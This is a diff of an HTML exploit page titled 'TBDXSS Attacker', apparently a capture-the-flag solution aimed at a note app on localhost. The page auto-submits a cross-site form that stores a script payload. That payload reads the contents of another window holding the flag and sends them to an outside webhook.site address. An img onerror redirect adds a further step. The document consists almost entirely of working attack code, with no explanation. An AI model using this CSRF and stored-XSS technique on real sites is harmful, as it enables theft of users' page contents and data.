@@ -4,27 +4,22 @@
         <title>TBDXSS Attacker</title>
     </head>
     <body>
-        <img src="http://34.123.246.143:5000/error" onerror="window.location.href='http://localhost:10001/note'">
+        <img src="http://34.123.246.143:8000/error" onerror="window.location.href='http://localhost:10001/note'">
         <form id="form" method="POST" action="http://localhost:10001/change_note" target="_blank">
             <textarea id="dataField" name="data"></textarea>
             <input type="submit" value="submit">
         </form>
         <script>
-            const delay = ms => new Promise(res => setTimeout(res, ms));
-            const mainFunc = async () => {
-                window.open('http://localhost:10001/note', 'flagWindow')
-                
-                await delay(1000);
-                dataField.value = `
-                    \x3cscript>
-                        const flagWindow = window.open('', 'flagWindow');
-                        const flagHTML = flagWindow.document.documentElement.innerHTML;
-                        window.location.href = 'https://webhook.site/ce587c88-e8e2-4397-9cb7-df2c22c5f8bb/FLAG_' + flagHTML;
-                    \x3c/script>
-                `
-                form.submit()
-            };
-            mainFunc();
+            window.open('http://localhost:10001/note', 'flagWindow')
+            
+            dataField.value = `
+                \x3cscript>
+                    const flagWindow = window.open('', 'flagWindow');
+                    const flagHTML = flagWindow.document.documentElement.innerHTML;
+                    window.location.href = 'https://webhook.site/ce587c88-e8e2-4397-9cb7-df2c22c5f8bb/FLAG_' + flagHTML;
+                \x3c/script>
+            `
+            form.submit()
         </script>
     </body>
 </html>
